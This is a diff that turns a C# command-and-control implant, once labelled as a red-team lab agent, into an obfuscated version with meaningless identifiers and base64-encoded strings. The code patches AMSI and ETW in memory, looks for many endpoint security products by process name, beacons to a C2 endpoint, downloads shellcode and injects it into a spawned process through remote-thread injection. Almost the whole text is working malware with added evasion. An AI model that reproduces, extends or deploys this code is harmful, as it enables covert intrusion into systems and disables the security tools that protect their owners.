@@ -1,6 +1,3 @@
-// KillShifterAgent.cs
-// Agent furtif avec migration de processus, scan SentinelOne, injection shellcode (lab Red Team only)
-
 using System;
 using System.Diagnostics;
 using System.Linq;
@@ -8,28 +5,59 @@ using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using System.Management;
 
-class KillShifterAgent
+class xA
 {
-    static readonly string c2Url = "http://127.0.0.1:5000/api/beacon";
-    static readonly string agentUuid = "agent-killshift-001";
+    static readonly string z0 = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzEyNy4wLjAuMTo1MDAwL2FwaS9iZWFjb24=")); // C2 URL
+    static readonly string z1 = Encoding.UTF8.GetString(Convert.FromBase64String("YWdlbnQta2lsbHNoaWZ0LTAwMQ==")); // Agent ID
 
     static async Task Main()
     {
-        BypassAmsiEtw();
+        b0();
 
-        // 🔍 Scan de présence SentinelOne
-        if (Process.GetProcessesByName("SentinelAgent").Any() ||
-            Process.GetProcessesByName("SentinelOne").Any())
+        string[] l0 = new[] {
+            "U2VudGluZWxBZ2VudA==", "U2VudGluZWxPbmU=", "bWNzaGllbGQ=", "bWZlbW1z", "bWFzdmM=", "bWNhZ2VudA==",
+            "Q1NGYWxjb25TZXJ2aWNl", "Q3Jvd2RTdHJpa2U=", "ZmFsY29uZA==",
+            "TXNNcEVuZw==", "U2Vuc2U=", "TXBDbXRSdW4=", "U2VjdXJpdHlIZWFsdGhTZXJ2aWNl",
+            "U29waG9zVUk=", "U0FWQWRtaW5TZXJ2aWNl", "U0FWU2VydmljZQ==", "U29waG9zRlM=", "U29waG9zSGVhbHRo", "c29waG9zY2xlYW4=", "SGl0bWFuUHJvLkFsZXJ0",
+            "b3NzZWMtYWdlbnQ=", "d2F6dWgtYWdlbnQ=", "d2F6dWgtbW9kdWxlc2Q=", "b3NzZWMtYXV0aGQ="
+        }.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))).ToArray();
+
+        var l1 = Process.GetProcesses()
+            .Where(p => l0.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
+            .Select(p => p.ProcessName)
+            .Distinct()
+            .ToList();
+
+        if (y1())
         {
-            Console.WriteLine("[!] SentinelOne détecté");
+            l1.Add("Sense (WMI)");
         }
 
-        string targetProc = "dllhost"; // Processus calme pour migration
-        int pid = SpawnProcess(targetProc);
-        if (pid == 0)
+        if (l1.Any())
         {
-            Console.WriteLine("[-] Échec du lancement de processus cible");
+            Console.WriteLine("[!] EDR détecté : " + string.Join(", ", l1));
+        }
+        else
+        {
+            Console.WriteLine("[+] Aucun EDR détecté connu");
+        }
+
+        string tP = "dllhost";
+        if (l1.Any(p => p.Contains("Sense")))
+            tP = "explorer";
+        else if (l1.Any(p => p.Contains("CrowdStrike") || p.Contains("CSFalcon")))
+            tP = "notepad";
+        else if (l1.Any(p => p.Contains("Sophos")))
+            tP = "conhost";
+        else if (l1.Any(p => p.Contains("wazuh") || p.Contains("ossec")))
+            tP = "svchost";
+
+        int pID = sP(tP);
+        if (pID == 0)
+        {
+            Console.WriteLine("[-] Processus échec");
             return;
         }
 
@@ -37,71 +65,80 @@ class KillShifterAgent
         {
             try
             {
-                using HttpClient client = new HttpClient();
-                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                using HttpClient c = new HttpClient();
+                c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
 
-                string request = agentUuid + "|BEACON_SHELLCODE";
-                var beacon = new StringContent(request, Encoding.UTF8, "text/plain");
-                HttpResponseMessage response = await client.PostAsync(c2Url, beacon);
+                string q = z1 + "|BEACON_SHELLCODE";
+                var d = new StringContent(q, Encoding.UTF8, "text/plain");
+                var r = await c.PostAsync(z0, d);
 
-                byte[] payload = await response.Content.ReadAsByteArrayAsync();
-                if (payload.Length > 0)
+                byte[] pl = await r.Content.ReadAsByteArrayAsync();
+                if (pl.Length > 0)
                 {
-                    bool injected = InjectInto(pid, payload);
-                    string result = agentUuid + (injected ? "|[+] Injection réussie" : "|[-] Injection échouée");
-                    await client.PostAsync(c2Url, new StringContent(result, Encoding.UTF8, "text/plain"));
+                    bool ok = inj(pID, pl);
+                    string res = z1 + (ok ? "|[+] Injection OK" : "|[-] Injection KO");
+                    await c.PostAsync(z0, new StringContent(res, Encoding.UTF8, "text/plain"));
                 }
             }
             catch { }
 
-            int delay = new Random().Next(30000, 60000);
-            await Task.Delay(delay);
+            await Task.Delay(new Random().Next(30000, 60000));
         }
     }
 
-    static bool InjectInto(int pid, byte[] payload)
+    static bool inj(int p, byte[] pl)
     {
-        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
-        if (hProc == IntPtr.Zero) return false;
+        IntPtr h = OpenProcess(0x001F0FFF, false, p);
+        if (h == IntPtr.Zero) return false;
 
-        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
-        if (addr == IntPtr.Zero) return false;
+        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
+        if (a == IntPtr.Zero) return false;
 
-        WriteProcessMemory(hProc, addr, payload, payload.Length, out _);
-        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _);
+        WriteProcessMemory(h, a, pl, pl.Length, out _);
+        CreateRemoteThread(h, IntPtr.Zero, 0, a, IntPtr.Zero, 0, out _);
         return true;
     }
 
-    static int SpawnProcess(string name)
+    static int sP(string n)
     {
         try
         {
-            var p = Process.Start(name + ".exe");
+            var p = Process.Start(n + ".exe");
             p.WaitForInputIdle();
             return p.Id;
         }
         catch { return 0; }
     }
 
-    static void BypassAmsiEtw()
+    static void b0()
     {
         try
         {
-            IntPtr amsi = LoadLibrary("amsi.dll");
-            IntPtr scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
-            VirtualProtect(scanBuf, (UIntPtr)6, 0x40, out _);
-            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, scanBuf, 4);
+            IntPtr l = LoadLibrary("amsi.dll");
+            IntPtr f = GetProcAddress(l, "AmsiScanBuffer");
+            VirtualProtect(f, (UIntPtr)6, 0x40, out _);
+            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, f, 4);
         }
         catch { }
 
         try
         {
-            IntPtr ntdll = LoadLibrary("ntdll.dll");
-            IntPtr etw = GetProcAddress(ntdll, "EtwEventWrite");
-            VirtualProtect(etw, (UIntPtr)6, 0x40, out _);
-            Marshal.Copy(new byte[] { 0xC3 }, 0, etw, 1);
+            IntPtr l2 = LoadLibrary("ntdll.dll");
+            IntPtr f2 = GetProcAddress(l2, "EtwEventWrite");
+            VirtualProtect(f2, (UIntPtr)6, 0x40, out _);
+            Marshal.Copy(new byte[] { 0xC3 }, 0, f2, 1);
         }
         catch { }
+    }
+
+    static bool y1()
+    {
+        try
+        {
+            var s = new ManagementObjectSearcher("SELECT * FROM Win32_Service WHERE Name='Sense'");
+            return s.Get().Count > 0;
+        }
+        catch { return false; }
     }
 
     [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
